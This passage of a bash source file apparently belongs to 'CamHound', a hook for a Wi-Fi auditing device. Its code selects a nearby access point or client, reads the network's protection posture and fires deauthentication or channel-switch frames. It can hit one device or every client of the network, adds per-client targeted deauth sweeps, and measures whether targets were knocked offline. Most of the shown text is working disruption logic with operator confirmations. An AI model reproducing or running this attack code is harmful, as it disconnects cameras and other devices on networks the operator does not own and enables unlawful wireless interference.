    R_BSSID="$mac"; R_TARGET="ff:ff:ff:ff:ff:ff"
  fi
  [[ $R_CH =~ ^[0-9]+$ ]] || return 1
  (( R_CH > 0 )) || return 1
  if [ "$R_BAND" = '?' ]; then    # no frequency seen for the target or its AP: the channel number decides
    if (( R_CH <= 14 )); then R_BAND=2; elif (( R_CH >= 36 && R_CH <= 177 )); then R_BAND=5; fi
  fi
  return 0
}

recon_stat() {   # recon_stat <mac> -> "packets last_seen", rc 1 when recon has no such row
  local mac="${1,,}" m a pk sig pr fr t ch ssid hid
  while IFS='|' read -r m a pk sig pr fr t ch; do
    [ "${m,,}" = "$mac" ] && { printf '%s %s' "${pk:-0}" "${t:-0}"; return 0; }
  done < <(recon_lines CLIENTS)
  while IFS='|' read -r m pk ssid ch fr sig hid t; do
    [ "${m,,}" = "$mac" ] && { printf '%s %s' "${pk:-0}" "${t:-0}"; return 0; }
  done < <(recon_lines APS)
  return 1
}

# resp_verdict <pk0> <t0> <pk1> <t1> <present_after> -> MOVED | NO_EFFECT | INCONCLUSIVE
# Every kernel-side drop path reports success, so "we sent it" proves nothing. Only the target's
# own behaviour afterwards does, and a stalled packet counter is the strongest signal recon gives.
resp_verdict() {
  local p0="$1" t0="$2" p1="$3" t1="$4" present="$5"
  # The baseline is tested FIRST, and this order is load-bearing. present=0 means "dropped out of
  # recon", which only means anything if the subject was in recon to begin with. A client Recon
  # never listed has p0 '-' and present 0, and judging presence first scored that MOVED -- a green
  # RESPOND_HIT, with 'pk_before=- pk_after=-' in the loot, for a device we never measured. The
  # client-row path in resp_fire synthesizes exactly that subject, so on firmware with no usable
  # association it was the common case, not an edge one.
  [[ $p0 =~ ^[0-9]+$ ]] || { printf 'INCONCLUSIVE'; return 0; }  # no usable baseline: nothing to compare
  [ "$present" = 0 ] && { printf 'MOVED'; return 0; }            # was measured before, gone now
  [[ $p1 =~ ^[0-9]+$ ]] || { printf 'INCONCLUSIVE'; return 0; }
  (( p1 > p0 )) && { printf 'NO_EFFECT'; return 0; }            # still transmitting
  [ "$t1" = "$t0" ] && { printf 'MOVED'; return 0; }            # counter stalled, nothing newer seen
  printf 'INCONCLUSIVE'
}

resp_write() {   # resp_write <mac> <badge> <attack> <cmd> <lock> <pk0> <pk1> <verdict> [measured target]
  local f="$LOOT_DIR/responses.tsv" bp=- tgt="${9:-$R_TARGET}"
  [ "$POSTURE_EXT" = - ] || bp=$(hex_octet "$POSTURE_EXT" 10 2>/dev/null) || bp=-
  [ -s "$f" ] || printf '%s\n' "$RESP_HDR" >"$f" 2>/dev/null
  printf '%s|%s|%s|%s|%s|%s|%s|%s|%s|%s|%s|%s|%s|%s|%s|%s\n' \
    "$EPOCHSECONDS" "$1" "${ROLE[$1]:--}" "$R_BSSID" "$tgt" "$R_CH" "$R_BAND" \
    "$2" "${POSTURE_RSN:--}" "$bp" "$3" "$4" "$5" "$6" "$7" "$8" >>"$f" 2>/dev/null
}

# resp_snapshot <scope> -> RS_PK/RS_T (packets, last-seen) for the subjects of the attempt, from one
# Recon read. The subjects are whatever the chosen attack reaches, which is NOT what the picked row
# implies: CSA and BOTH transmit BSS-wide even from a client row (see attack_scope), so measuring
# only the picked device would report a one-camera result as the outcome of a BSS-wide transmit and
# leave the rest of the BSS out of the loot. scope cli measures the one target; scope bss measures
# the BSSID's visible, non-random clients.
# The picked target is always a subject, even behind a randomised MAC the bss sweep otherwise skips.
# The AP's own counter is never the subject: it keeps beaconing whatever happens to its clients.
declare -A RS_PK RS_T
# The membership set for the attempt, and the BSSID it was gathered for. Paired on purpose: a set
# left over from a previous target must never be applied to this one, which is the bug posture_of
# documents for its caps globals.
declare -A RESP_MEMBERS; RESP_MEMBERS_BSS=''
BSS_ITMAX=0; BSS_RECS=0; BSS_SHORT=0; BSS_TRUNC=0; BSS_RUNT=0; MEMBERS_TEXT=''; MEMBERS_WHY=''

# resp_members <bssid> -> 0 with RESP_MEMBERS filled, or 1 with MEMBERS_WHY set to one of
# NO_CAPTURE (no tcpdump, or tcpdump refused the filter), SNAP_SHORT (frames arrived but every
# record was too short to hold addr2 -- raise CLI_CAP_SNAP) or NO_CLIENTS (armed, listened, nobody
# there). Three different answers: "we could not look", "we looked through too small a window" and
# "the BSS is empty" are not the same finding, and before this existed they were all one silence.
resp_members() {
  local bss="${1,,}" f out rc kk vv
  RESP_MEMBERS=(); RESP_MEMBERS_BSS=''; MEMBERS_TEXT=''; MEMBERS_WHY=''
  BSS_ITMAX=0; BSS_RECS=0; BSS_SHORT=0; BSS_TRUNC=0; BSS_RUNT=0
  if [ "$HAVE_TCPDUMP" != 1 ]; then
    MEMBERS_WHY=NO_CAPTURE; MEMBERS_TEXT="no tcpdump: cannot read who is on ${bss:9}"; return 1
  fi
  if ! f=$(capture_bss "$bss"); then
    MEMBERS_WHY=NO_CAPTURE; MEMBERS_TEXT="capture did not arm on ${bss:9}"; return 1
  fi
  out=$(bss_clients "$f" "$bss"); rc=$?; rm -f "$f"
  if (( rc != 0 )); then         # bad magic, or too short to be a pcap: we could not look, which is
    MEMBERS_WHY=NO_CAPTURE       # not the same answer as looking and finding nobody
    MEMBERS_TEXT="capture on ${bss:9} is not a readable pcap"; return 1
  fi
  while read -r kk vv; do        # a here-string, so these land in THIS shell, not a subshell
    case "$kk" in
      ITMAX) BSS_ITMAX="$vv" ;; RECS) BSS_RECS="$vv" ;; SHORT) BSS_SHORT="$vv" ;;
      TRUNC) BSS_TRUNC="$vv" ;; RUNT) BSS_RUNT="$vv" ;;
      CLI)   [ -n "$vv" ] && RESP_MEMBERS[$vv]=1 ;;
    esac
  done <<<"$out"
  if (( ${#RESP_MEMBERS[@]} == 0 )); then
    if (( BSS_TRUNC > 0 )); then     # a record AT the snaplen was cut: the snap is the knob
      MEMBERS_WHY=SNAP_SHORT
      MEMBERS_TEXT="snap $CLI_CAP_SNAP too small for radiotap $BSS_ITMAX: raise CLI_CAP_SNAP"
    else
      MEMBERS_WHY=NO_CLIENTS; MEMBERS_TEXT="no clients heard on ${bss:9} in ${CLI_CAP_SECS}s"
    fi
    return 1
  fi
  RESP_MEMBERS_BSS="$bss"
  return 0
}
resp_snapshot() {
  local scope="${1:-cli}" m a pk sig pr fr t ch s
  RS_PK=(); RS_T=()
  while IFS='|' read -r m a pk sig pr fr t ch; do
    m=${m,,}; a=${a,,}
    if [ "$scope" = bss ]; then
      # UNION, not replacement. The ap_mac test is the identity transform on real firmware (where
      # $a is always "-") and still the right answer if a firmware ever supplies association; the
      # membership set is what makes the sweep work today. Replacing it breaks 5 of the 9 snapshot
      # selftest cases, whose fixtures carry an ap_mac column no shipped firmware emits.
      # The set is ignored unless it was gathered for THIS BSSID.
      [ "$a" = "$R_BSSID" ] || { [ "$RESP_MEMBERS_BSS" = "$R_BSSID" ] && [ -n "${RESP_MEMBERS[$m]+x}" ]; } || continue
      [ "$m" != "$R_TARGET" ] && is_rand "$m" && continue
    else [ "$m" = "$R_TARGET" ] || continue; fi
    RS_PK[$m]="${pk:-0}"; RS_T[$m]="${t:-0}"
  done < <(recon_lines CLIENTS)
  if [ "$R_TARGET" != ff:ff:ff:ff:ff:ff ] && [ -z "${RS_PK[$R_TARGET]+x}" ]; then   # a client row Recon lists as an AP
    if s=$(recon_stat "$R_TARGET"); then read -r pk t <<<"$s"; RS_PK[$R_TARGET]="$pk"; RS_T[$R_TARGET]="$t"; fi
  fi
}
# resp_aggregate <moved> <no_effect> <inconclusive> -> one word for the whole attempt
resp_aggregate() {
  (( $2 > 0 )) && { printf 'NO_EFFECT'; return 0; }           # any subject kept transmitting
  (( $1 > 0 && $3 == 0 )) && { printf 'MOVED'; return 0; }     # every subject went quiet
  printf 'INCONCLUSIVE'
}

resp_fire() {   # resp_fire <mac> <attack key> <badge> -> 0 when a verdict was reached
  local mac="$1" k="$2" badge="$3" cmd lock rc m p0 t0 p1 t1 present verdict nmv=0 nne=0 ninc=0 n
  local scope tgt_verdict=- cap_secs lock_secs t_cap why frc ferr nmeas=0
  local -a subjects=(); local -A P0=() T0=()
  RESP_MEMBERS=(); RESP_MEMBERS_BSS=''      # never inherit a previous target's set
  cmd=$(response_cmd "$k")
  [ -n "$cmd" ] || return 1
  if ! command -v "$cmd" >/dev/null 2>&1; then
    LOG red "$cmd not present in this firmware"; log resp "missing $cmd"; return 1
  fi
  scope=$(attack_scope "$k")      # what the command can reach, which is not what the row implies
  # The lock is taken FIRST, before any reading. One episode now covers lock -> membership capture
  # -> pre-read -> fire -> settle -> post-read -> unlock. Forced, because the capture has to happen
  # on the target's channel and the pre-read has to see the members it found. It also removes an
  # asymmetry that was quietly biasing the oracle: the pre-read used to run unlocked while the
  # post-read ran locked, and an unlocked read sees a hopping radio's thinner counters.
  cap_secs=0; [ "$scope" = bss ] && cap_secs=$(( CLI_CAP_SECS + 2 ))
  lock_secs=$(( RESP_LOCK_SECS + cap_secs ))   # additive: resp_clamp_lock's floor is not ours to move
  lock_target "$R_BSSID" "$lock_secs" "$R_CH"; rc=$?
  case $rc in 0) lock=ok ;; 1) lock=by-channel ;; 3) lock=unverified ;; *) lock=failed ;; esac
  if (( rc == 2 )); then
    unlock_target
    LOG red "lock failed: $LOCK_TEXT"; log resp "lock-failed $R_BSSID $LOCK_TEXT"
    resp_write "$mac" "$badge" "$k" "$cmd" "$lock" - - LOCK_FAILED
    set_state INCONCLUSIVE; return 1
  fi
  if [ "$scope" = bss ]; then
    t_cap=$EPOCHSECONDS
    # A capture that hears nothing is a REASON, never a verdict on its own. Returning here would
    # REPLACE the ap_mac path rather than add to it -- the same mistake as replacing resp_snapshot's
    # ap_mac test instead of unioning with it, one level up in the control flow. So the reason is
    # recorded and the Recon read still happens; only a subject set that is empty AFTER both
    # sources refuses, and it refuses with whichever reason the capture gave.
    resp_members "$R_BSSID" || true
    # The dwell figure the recon-side session needs for resp_clamp_lock's floor, handed over as a
    # measurement rather than a unilateral change to their function. dev/CamHound/README.md lists it
    # among the first-run markers to watch.
    log resp "members $R_BSSID n=${#RESP_MEMBERS[@]} why=${MEMBERS_WHY:-ok} itmax=$BSS_ITMAX recs=$BSS_RECS short=$BSS_SHORT trunc=$BSS_TRUNC runt=$BSS_RUNT dwell=$(( EPOCHSECONDS - t_cap ))s lock=${lock_secs}s"
    # Re-arm before the measurement, rather than sizing cap_secs to cover the parse.
    # The capture does not need a guaranteed lock: if the radio resumes hopping mid-capture we
    # simply hear fewer stations, and the member set honestly reports what it heard. The
    # MEASUREMENT does need one -- a lock expiring between the pre-read and the post-read lets the
    # post-read land on a hopping radio, whose cumulative Recon counter looks stalled, and
    # resp_verdict scores a stalled counter MOVED. That is the exact false green this rung exists
    # to prevent. Sizing a constant instead cannot be done honestly: the walker takes 2.5-9.1 s on
    # the device for a full CLI_CAP_COUNT buffer (RESPONSE.md 13a-i), so any fixed number either
    # over-locks every quiet BSS or under-locks a busy one. Re-arming costs lock_target's channel
    # read-back and is exact. Measured on the air, the dwell line above is what tells us which.
    lock_target "$R_BSSID" "$RESP_LOCK_SECS" "$R_CH"; rc=$?
    case $rc in 0) lock=ok ;; 1) lock=by-channel ;; 3) lock=unverified ;; *) lock=failed ;; esac
    if (( rc == 2 )); then
      unlock_target
      LOG red "lock lost after the capture: $LOCK_TEXT"; log resp "lock-failed-rearm $R_BSSID $LOCK_TEXT"
      resp_write "$mac" "$badge" "$k" "$cmd" "$lock" - - LOCK_FAILED
      set_state INCONCLUSIVE; return 1
    fi
    log resp "re-armed $R_BSSID ${RESP_LOCK_SECS}s for the measurement lock=$lock"
  fi
  resp_snapshot "$scope"
  for m in "${!RS_PK[@]}"; do subjects+=("$m"); P0[$m]="${RS_PK[$m]}"; T0[$m]="${RS_T[$m]}"; done
  nmeas=${#subjects[@]}      # of the subjects, how many Recon can actually score
  if [ "$R_TARGET" = ff:ff:ff:ff:ff:ff ]; then
    # A heard station is a TARGET even when it is not a SUBJECT, and conflating the two was a real
    # defect: measuring a device needs a Recon row and an address stable enough to compare across
    # the fire, but TRANSMITTING at it needs neither -- the frame carries an address, not a
    # baseline. Until 2026-11-09 `subjects` was both sets at once, so an AP whose only client was a
    # randomised-MAC phone refused with NO_MATCH and sent NOTHING. Measured on the bench, seven
    # consecutive attempts on fc:58:5a:08:42:15: `resp members ... n=1 why=ok ... recs=286..468`
    # (the capture heard the station, zero short/trunc/runt) followed by `refused ... NO_MATCH
    # members=1`, with pk_before and pk_after both '-' in every loot row -- while the GUI's AP-row
    # deauth, which is the SAME opcode-400 broadcast frame this function would have sent, dropped
    # that client on demand. The measurement gate was gating the transmit.
    # These members get p0 '-', so resp_verdict returns INCONCLUSIVE for them rather than inventing
    # a verdict -- the honest answer for a device we disconnected but cannot score.
    if [ "$RESP_MEMBERS_BSS" = "$R_BSSID" ]; then
      for m in "${!RESP_MEMBERS[@]}"; do
        [ "$m" = ff:ff:ff:ff:ff:ff ] && continue
        [ -n "${P0[$m]+x}" ] && continue          # already a measurable subject
        subjects+=("$m"); P0[$m]=-; T0[$m]=-
      done
    fi
    if (( ${#subjects[@]} == 0 )); then     # heard nobody AND can measure nobody: nothing to aim at
      unlock_target                      # every refusal past the lock must release it, or a leaked
      log resp "unlocked after refusal"  # EXAMINE pins the radio off its hop cycle for the run
      if [ -n "$MEMBERS_WHY" ]; then
        why="$MEMBERS_WHY"; LOG red "$MEMBERS_TEXT"
      else
        # Reachable only if a membership set was gathered for a DIFFERENT BSSID, which resp_fire's
        # entry reset should prevent; kept as a guard rather than a claim about the air.
        why=NO_CLIENTS; LOG red "no visible clients on ${R_BSSID:9}: nothing to disconnect"
      fi
      log resp "refused $R_BSSID $why members=${#RESP_MEMBERS[@]} itmax=$BSS_ITMAX recs=$BSS_RECS short=$BSS_SHORT"
      resp_write "$mac" "$badge" "$k" "$cmd" "$lock" - - "$why"
      set_state RESPOND_NIL; return 1
    fi
  else
    (( ${#subjects[@]} == 0 )) && { subjects=("$R_TARGET"); P0[$R_TARGET]=-; T0[$R_TARGET]=-; }
  fi
  n=${#subjects[@]}
  [ "$lock" = unverified ] && LOG yellow "$LOCK_TEXT"
  set_state RESPOND
  LOG "$k -> ${R_BSSID:9} ch $R_CH"$'\n'"lock: $lock, $n subject(s)"
  log resp "fire $k $R_BSSID $R_TARGET ch$R_CH badge=$badge lock=$lock scope=$scope subjects=$n measurable=$nmeas heard=${#RESP_MEMBERS[@]}"
  # Capture the command's rc AND its stderr. Discarding both was a real defect: if the firmware
  # refuses the command nothing leaves the radio, yet the loot row still read NO_EFFECT (subjects
  # kept transmitting) or MOVED (a counter happened to stall) -- indistinguishable from a real
  # measurement. NO_EFFECT in particular reads as the firmware fact "CSA does not move this
  # camera", which is one of the open questions this rung exists to ANSWER (CLAUDE.md, day-one
  # 17a). A swallowed refusal does not merely lose information, it files a fabricated answer.
  # CMD_REFUSED is deliberately NOT in the MOVED/NO_EFFECT/INCONCLUSIVE vocabulary, so a refusal
  # can never be mistaken for a measurement by a reader of responses.tsv.
  : >"$FIRE_ERR"
  if [ "$k" = CSA ]; then "$cmd" "$R_BSSID" "$R_CH" >/dev/null 2>"$FIRE_ERR"
  else "$cmd" "$R_BSSID" "$R_TARGET" "$R_CH" >/dev/null 2>"$FIRE_ERR"; fi
  frc=$?; ferr=$(tr '\n' ' ' <"$FIRE_ERR" 2>/dev/null); ferr=${ferr:0:200}; rm -f "$FIRE_ERR"
  log resp "cmd $cmd rc=$frc${ferr:+ err=$ferr}"
  if (( frc != 0 )) || [ -n "$ferr" ]; then
    unlock_target; log resp "unlocked after refusal"
    LOG red "$cmd refused (rc $frc): nothing was transmitted"${ferr:+$'\n'"$ferr"}
    for m in "${subjects[@]}"; do resp_write "$mac" "$badge" "$k" "$cmd" "$lock" "${P0[$m]}" - CMD_REFUSED "$m"; done
    set_state RESPOND_NIL; return 1
  fi
  # Targeted sweep. Measured on the bench 2026-11-05 against one phone on one AP: a TARGETED
  # PINEAPPLE_DEAUTH_CLIENT dropped it immediately, while PINEAPPLE_DEAUTH_CLIENT_ALL and
  # PINEAPPLE_DEAUTH_CLIENT_CSA were both accepted (rc 0) and did nothing. That is one data point
  # from the hardest class of client - a modern phone with a randomised MAC - and it says nothing
  # about what a cheap camera's stack does, so this ADDS a targeted frame per member rather than
  # replacing the broadcast one. The two are complementary, not ordered: broadcast reaches members
  # the capture never enumerated and is immune to a stale address, while targeted reaches members
  # that filter broadcast. Doing both is better than either, and costs n frames instead of one.
  # Not for CSA: that command takes no target (<bssid> <channel>, arity measured on the device).
  # Guarded on SCOPE, not on R_TARGET being broadcast. attack_scope is the single place blast radius
  # is decided, and a CLIENT row firing BOTH is scope=bss with R_TARGET set to the client - _ALL
  # discards that target and goes BSS-wide regardless - so an R_TARGET test would skip the sweep in
  # exactly the case it is most needed. Unreachable until the inverse lookup lands; wrong now.
  if [ "$SWEEP_TARGETED" = 1 ] && [ "$k" != CSA ] && [ "$scope" = bss ] && (( n > 0 )); then
    local sw_cmd sw_ok=0 sw_rc sw_err
    sw_cmd=$(response_cmd DEAUTH)
    if [ -n "$sw_cmd" ] && command -v "$sw_cmd" >/dev/null 2>&1; then
      for m in "${subjects[@]}"; do
        : >"$FIRE_ERR"
        "$sw_cmd" "$R_BSSID" "$m" "$R_CH" >/dev/null 2>"$FIRE_ERR"; sw_rc=$?
        sw_err=$(tr '\n' ' ' <"$FIRE_ERR" 2>/dev/null); rm -f "$FIRE_ERR"
        # rc is useless on this firmware (hak5cmd exits 0 on its error paths too, measured), so the
        # stderr is the only signal that a frame was refused.
        if (( sw_rc == 0 )) && [ -z "$sw_err" ]; then sw_ok=$((sw_ok + 1))
        else log resp "sweep $m rc=$sw_rc${sw_err:+ err=${sw_err:0:120}}"; fi
      done
      log resp "sweep $sw_cmd $R_BSSID targeted=$sw_ok of $n"
      (( sw_ok > 0 )) && LOG "targeted $sw_ok/$n client(s)"
    fi
  fi
  sleep "$RESP_SETTLE_SECS"
  resp_snapshot "$scope"
  unlock_target
  for m in "${subjects[@]}"; do
    p0="${P0[$m]}"; t0="${T0[$m]}"; present=1; p1=-; t1=-
    if [ -n "${RS_PK[$m]+x}" ]; then p1="${RS_PK[$m]}"; t1="${RS_T[$m]}"; else present=0; fi
    verdict=$(resp_verdict "$p0" "$t0" "$p1" "$t1" "$present")
    case "$verdict" in MOVED) nmv=$((nmv + 1)) ;; NO_EFFECT) nne=$((nne + 1)) ;; *) ninc=$((ninc + 1)) ;; esac
    [ "$m" = "$R_TARGET" ] && tgt_verdict="$verdict"
    resp_write "$mac" "$badge" "$k" "$cmd" "$lock" "$p0" "$p1" "$verdict" "$m"
    log resp "subject $m $verdict pk $p0 -> $p1 present=$present"
  done
  verdict=$(resp_aggregate "$nmv" "$nne" "$ninc")
  log resp "verdict $verdict $R_TARGET scope=$scope moved=$nmv no_effect=$nne inconclusive=$ninc of $n"
  case "$verdict" in
    MOVED)     set_state RESPOND_HIT; LOG green "$verdict: $nmv/$n quiet" ;;
    NO_EFFECT) set_state RESPOND_NIL; LOG yellow "$verdict: $nne/$n still transmitting" ;;
    *)         set_state INCONCLUSIVE; LOG yellow "$verdict: $ninc/$n unsettled, $nmv quiet" ;;
  esac
  # The aggregate word covers the whole blast radius, which is the honest summary of a BSS-wide
  # transmit. The operator still picked one device, so name that device's own verdict too, or a
  # collateral NO_EFFECT reads as "the camera I aimed at stayed up".
  if [ "$R_TARGET" != ff:ff:ff:ff:ff:ff ] && (( n > 1 )); then
    LOG "picked ${R_TARGET:9}: $tgt_verdict"; log resp "picked $R_TARGET $tgt_verdict of $n subjects"
  fi
  return 0
}

# auto_respond_ok <mac> -> 0 when the funnel may offer Disrupt without being asked.
# Two keys, not one: RESPONSE opens the manual rung, AUTO_RESPOND additionally lets CamHound
# raise it on its own. Note this resolves the target as a side effect, leaving R_* set.
auto_respond_ok() {
  [ "$RESPONSE" = 1 ] || return 1
  [ "$AUTO_RESPOND" = 1 ] || return 1
  [ -n "${IGNORED[$1]}" ] && return 1
  resp_target "$1" >/dev/null 2>&1 || return 1
  return 0
}

disrupt_row() {   # a cached badge is free to show; an uncached one is not worth a capture to render
  local mac="$1" ap bss
  # Mirrors "Watch n/a (not associated)" two lines up in detail_card. Without this the operator
  # presses Disrupt, resp_target refuses, the red line lands on the log pane BEHIND the card, and
  # the card redraws unchanged - which reads as a dead button. Safe to call resp_target here:
  # disrupt_row always runs inside $( ), so the globals it sets die with the subshell.
  if [ "${ROLE[$mac]}" = cli ] && { [ -z "${AP_OF[$mac]}" ] || [ "${AP_OF[$mac]}" = - ]; }; then
    printf 'Disrupt n/a (not associated)'; return 0     # no BSS to announce from
  fi
  resp_target "$mac" || { printf 'Disrupt n/a (no channel)'; return 0; }
  [ "${ROLE[$mac]}" = cli ] && bss="${AP_OF[$mac]:--}" || bss="$mac"
  if [ -n "${POSTURE[$bss]}" ] && (( EPOCHSECONDS - ${POSTURE_TS[$bss]:-0} < POSTURE_TTL )); then
    printf 'Disrupt [%s]' "${POSTURE[$bss]}"
  else
    printf 'Disrupt'
  fi
}

disrupt_menu() {   # the three attacks, ordered and labelled by what the beacon says will work
  local mac="$1" badge opts k exp scope items=() pickmap=() i=0 choice
  if ! resp_target "$mac"; then
    LOG red "nothing to attack: no associated BSS or no channel for $mac"; return 0
  fi
  LOG "reading posture ${R_BSSID:9} ch $R_CH"
  inj_probe                    # here, not inside posture_of: $( ) would discard the cache
  posture_of "$R_BSSID" "$R_BAND" "$R_CH" >/dev/null; badge="$POSTURE_LAST"
  opts=$(posture_opts "$badge")
  LOG "[$badge] ${R_BSSID:9} ch$R_CH ${R_BAND}GHz"$'\n'"target ${R_TARGET:9}"$'\n'"$(posture_why "$badge")"
  if [ -z "$opts" ]; then
    LOG red "$(posture_why "$badge")"
    confirm "Nothing is expected to work ($badge). Try anyway?" || return 0
    opts='BOTH DEAUTH CSA'
  elif [ "$badge" = '?' ]; then
    # No beacon was captured, so nothing below is advice -- say so instead of firing on one accept.
    confirm "Posture unread on ${R_BSSID:9}: no beacon captured. Fire blind?" || return 0
  fi
  for k in $opts; do
    exp=$(posture_expect "$badge" "$k")
    [ "$(attack_scope "$k")" = bss ] && scope=' bss' || scope=''
    items+=("$(printf '%s%s (%s)' "$k" "$scope" "$exp")"); pickmap+=("$k"); i=$((i + 1))
  done
  pick_list "Disrupt [$badge] ${R_TARGET:9}" "${items[0]}" "${items[@]}" "Back" || return 0
  [ "$PICK" = Back ] && return 0
  choice=""
  for ((i = 0; i < ${#items[@]}; i++)); do [ "$PICK" = "${items[$i]}" ] && choice="${pickmap[$i]}"; done
  [ -n "$choice" ] || return 0
  if [ "$RESPONSE_CONFIRM" != 0 ]; then    # fail closed: only an explicit 0 removes the confirm
    # Name the real blast radius: "CSA on <one client>" would be a lie, the command has no target.
    if [ "$(attack_scope "$choice")" = bss ]; then
      confirm "$choice on EVERY client of ${R_BSSID:9} ch $R_CH?" || { LOG "cancelled"; return 0; }
    else
      confirm "$choice on ${R_TARGET:9} via ${R_BSSID:9} ch $R_CH?" || { LOG "cancelled"; return 0; }
    fi
  fi
  resp_fire "$mac" "$choice" "$badge"
}

posture_why() {   # one line of plain English for a badge
  case "$1" in
    'D+C')   printf 'no PMF: deauth and CSA both land' ;;
    'D?+C')  printf 'PMF optional: deauth works per-client, CSA lands' ;;
    'C')     printf 'PMF required: deauth is ignored, CSA still lands' ;;
    'NONE')  printf 'PMF + beacon protection: no frame this firmware sends works' ;;
    'NOINJ') printf 'DFS or 6 GHz: the radio may not transmit on this channel' ;;
    *)       printf 'posture unread: no beacon captured' ;;
  esac
}
# --- response rung end ---

# --- watch core end ---

# ============================================================================== hook main ===
# Entered from the Recon menu with a selected AP or client. Everything above this line is copied
# from the user payload by dev/CamHound/gen_hooks.sh.
case "${1:-}" in
  -h|--help|--selftest|--replay) printf 'CamHound Recon hook: launch it from the Recon AP or client menu. Laptop checks live in the user payload (payload.sh --selftest).\n'; exit 0 ;;
esac
write_report() { :; }          # the hook keeps no report; cleanup() may call it
HOOK_MAC=""
set_state SETUP
INSTALL_DIR=$(find_install_dir) || INSTALL_DIR=""
run_lock
preflight
apply_mode
load_overrides

# hook_target: build one inventory record from the _RECON_SELECTED_* variables (MAC_PICKER fallback)
hook_target() {
  local mac bssid ssid freq ch rssi role probes
  mac=${_RECON_SELECTED_CLIENT_MAC_ADDRESS:-${_RECON_SELECTED_CLIENT_MAC:-}}; mac=${mac,,}
  bssid=${_RECON_SELECTED_AP_BSSID:-${_RECON_SELECTED_AP_MAC_ADDRESS:-}}; bssid=${bssid,,}
  [[ $bssid =~ ^([0-9a-f]{2}:){5}[0-9a-f]{2}$ ]] || bssid=""
  if [[ $mac =~ ^([0-9a-f]{2}:){5}[0-9a-f]{2}$ ]]; then role=cli; HOOK_MAC=$mac
  elif [ -n "$bssid" ]; then role=ap; HOOK_MAC=$bssid
  else
    mac=$(MAC_PICKER "Target MAC?" "DE:AD:BE:EF:CA:FE" 2>/dev/null) || { LOG "no target selected"; exit 0; }
    mac=${mac,,}; [[ $mac =~ ^([0-9a-f]{2}:){5}[0-9a-f]{2}$ ]] || { LOG "not a MAC: $mac"; exit 0; }
    role=ap; HOOK_MAC=$mac; bssid=$mac
    LOG "manual target: treated as an AP (BSSID = MAC)"
  fi
  ssid=$(clean_text "${_RECON_SELECTED_AP_SSID:-${_RECON_SELECTED_AP_BEACONED_SSID:-}}" 32)
  freq=${_RECON_SELECTED_AP_FREQ:-0}; freq=${freq//[!0-9]/}
  ch=${_RECON_SELECTED_AP_CHANNEL:-0}; [ "$role" = cli ] && [ -n "${_RECON_SELECTED_CLIENT_CHANNEL:-}" ] && ch=$_RECON_SELECTED_CLIENT_CHANNEL; ch=${ch//[!0-9]/}
  rssi=${_RECON_SELECTED_CLIENT_RSSI:-${_RECON_SELECTED_AP_RSSI:-}}; rssi=${rssi//[!0-9-]/}
  record_seen "$HOOK_MAC" "$role" "$ssid" "${ch:-0}" "${freq:-0}" "${rssi:--}"
  if [ "$role" = cli ]; then AP_OF[$HOOK_MAC]="${bssid:--}"
  else HIDDEN[$HOOK_MAC]=0; [ -z "$ssid" ] && HIDDEN[$HOOK_MAC]=1; fi
  probes=${_RECON_SELECTED_CLIENT_PROBED_SSID:-}
  [ -n "$probes" ] && PROBES[$HOOK_MAC]=$(clean_text "$probes" 64)
  score_device "$HOOK_MAC"; prox_of "$HOOK_MAC"
  log run "hook v$VERSION target=$HOOK_MAC role=$role conf=${CONF[$HOOK_MAC]} tags=${TAGS[$HOOK_MAC]:--}"
}

hook_menu() {
  local m="$HOOK_MAC" wrow drow
  while :; do
    LOG "[$MODE] ${CONF[$m]} ${BANDNAME[$m]} ${ROLE[$m]} $m"$'\n'"cat: ${CAT[$m]} ${VENDOR[$m]:--}"$'\n'"ssid: ${SSID_CLEAN[$m]:--} ch${CH[$m]:-?} ${BAND[$m]:-?}GHz"$'\n'"rssi ${RSSI_LAST[$m]:--} ${PROX[$m]:-?}"$'\n'"tags: ${TAGS[$m]:--}"
    if watchable "$m"; then wrow="Watch"; elif [ "$HAVE_TCPDUMP" != 1 ]; then wrow="Watch (no tcpdump)"; else wrow="Watch n/a (not associated)"; fi
    drow=""; [ "$RESPONSE" = 1 ] && drow=$(disrupt_row "$m")
    pick_list "${CONF[$m]} ${ID_LABEL[$m]:-${TAGS[$m]%% *}} ${m:9}" "$wrow" "$wrow" ${drow:+"$drow"} "Locate" "Exit" || return 0
    case "$PICK" in
      "Disrupt"*) disrupt_menu "$m" ;;
      "Watch") watch_menu "$m" ;;
      "Watch (no tcpdump)") LOG "tcpdump missing: opkg update; opkg install tcpdump" ;;
      "Watch n/a"*) LOG "probe-only client: identity and Locate only" ;;
      "Locate") locate_target "$m" ;;
      *) return 0 ;;
    esac
  done
}

hook_target
hook_menu
exit 0
